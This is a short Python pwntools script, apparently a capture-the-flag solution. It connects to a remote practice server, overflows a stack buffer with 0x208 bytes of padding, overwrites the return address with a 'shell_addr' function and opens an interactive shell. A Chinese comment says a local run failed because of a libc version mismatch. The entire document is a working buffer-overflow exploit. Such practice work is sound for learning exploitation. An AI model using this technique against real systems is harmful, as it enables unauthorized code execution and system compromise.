from pwn import *

context.log_level = 'DEBUG'

# p = process('../file/ad72d90fbd4746ac8ea80041a1f661c2') # 本地运行失败，因为本地的libc和服务器上libc不是一个版本，具体原因待研究
p = remote('61.147.171.105', '50025')

input('continue?')

shell_addr = 0x004005f6

p.sendlineafter(b'>', b'a' * 0x208 + p64(shell_addr))

p.interactive()